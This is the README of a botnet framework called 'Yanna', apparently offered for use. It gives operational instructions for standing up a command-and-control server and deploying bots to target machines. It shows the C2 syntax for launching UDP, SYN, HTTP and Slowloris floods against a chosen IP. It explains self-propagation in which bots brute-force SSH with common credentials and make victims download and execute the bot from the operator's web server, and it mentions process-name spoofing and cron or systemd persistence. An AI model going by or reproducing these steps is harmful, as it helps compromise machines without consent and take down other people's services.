# Yanna Botnet Framework

Yanna is an advanced, modular botnet framework inspired by the design principles of the Mirai botnet. It features encrypted C2 communication, a self-propagating scanner to grow the botnet, a variety of both Layer 4 and Layer 7 DDoS attack vectors, and built-in evasion and persistence techniques.

## Features

-   **Encrypted C2:** All communication between the C2 server and bots uses AES-256 encryption to prevent sniffing.
-   **Database-Backed C2:** The C2 server uses an SQLite database to track all bots, their status, and metadata.
-   **Modular Architecture:** Attacks, scanning, and utilities are separated into modules for easy expansion.
-   **Self-Propagation:** Bots can actively scan for other vulnerable devices (via SSH with common credentials) and infect them to automatically grow the botnet.
-   **Diverse Attack Methods:**
    -   **Layer 4:** UDP Flood, TCP (SYN) Flood
    -   **Layer 7:** HTTP GET Flood, Slowloris
-   **Evasion & Persistence:** The bot spoofs its process name and attempts to install itself as a `cron` job or `systemd` service to survive reboots.
-   **Advanced CLI:** The C2 server features a command-line interface for easy management of the botnet.

---

## Setup & Deployment

### 1. Prerequisites

You will need a server (a cheap VPS is recommended) with a public IP address to act as your Command and Control (C2) server.

You will also need Python 3 and `pip` installed on both your C2 server and any machine you intend to run the bot on.

### 2. C2 Server Setup

1.  **Clone the repository:**
    ```bash
    git clone https://github.com/your-username/Yanna-Framework-V2.git
    cd Yanna-Framework-V2
    ```

2.  **Install dependencies:**
    ```bash
    pip install -r requirements.txt
    ```

3.  **Allow C2 port through firewall:**
    You must allow incoming TCP connections on port `4444`.
    ```bash
    # On Ubuntu/Debian with ufw
    sudo ufw allow 4444/tcp
    ```

4.  **Run the C2 server:**
    ```bash
    python3 yanna_c2.py
    ```
    The server is now running and waiting for bots to connect.

### 3. Bot Configuration and Deployment

1.  **Configure the bot:**
    -   Open the file `bot/main.py`.
    -   **CRITICALLY IMPORTANT:** Change the `C2_HOST` variable to the public IP address of your C2 server.
    ```python
    # bot/main.py
    C2_HOST = 'YOUR_C2_SERVER_IP' 
    ```

2.  **Deploy the bot:**
    -   Copy the entire `bot` directory to a target machine.
    -   Install the required dependencies on the target machine: `pip install -r requirements.txt`.
    -   Run the bot: `python3 bot/main.py`.
    -   Upon execution, the bot will connect back to your C2 server. You should see a `[+] Bot Online:` message in your C2 terminal.

---

## C2 Usage

The C2 server provides a simple shell interface.

### Basic Commands

-   `help`: Shows a list of all available commands.
-   `bots list`: Lists all bots that have ever connected, showing their status, IP, OS, and last seen time.
-   `bots select <uid>`: Selects a specific bot to send commands to.
-   `bots all`: Sets the target back to all online bots (default).
-   `exit`: Shuts down the C2 server.

### Attacking

To launch an attack from the currently selected bot(s):

```
attack <method> <ip> <port> <duration>
```
-   **method**: `UDP`, `TCP`, `HTTP`, or `SLOWLORIS`.
-   **ip**: The target's IP address.
-   **port**: The target's port.
-   **duration**: The attack duration in seconds.

**Example:**
```
(Yanna C2 | all) attack HTTP 1.2.3.4 80 300
```
This command orders all online bots to launch an HTTP flood against `1.2.3.4` on port `80` for `300` seconds.

### Self-Propagation (Scanning)

To make the botnet grow itself, you need to host the bot payload on a simple web server.

1.  **On a machine with a public IP**, navigate to the directory containing the `bot` folder and run a simple HTTP server.
    ```bash
    # Make sure you are in the Yanna-Framework-V2 directory
    # The command below will host bot/main.py
    python3 -m http.server 8000
    ```
    Keep this server running.

2.  **In the C2 terminal**, issue the `scan` command:
    ```
    scan start <your_public_ip>
    ```
    Replace `<your_public_ip>` with the IP of the machine hosting the HTTP server.

The bots will now begin scanning the internet for vulnerable devices. When a victim is found, the bot will instruct it to download `http://<your_public_ip>:8000/bot/main.py` and execute it, adding a new bot to your army.

### Stopping Tasks

To stop any current task (attack or scan) on the selected bot(s), use the `stop` command.

```
stop
```
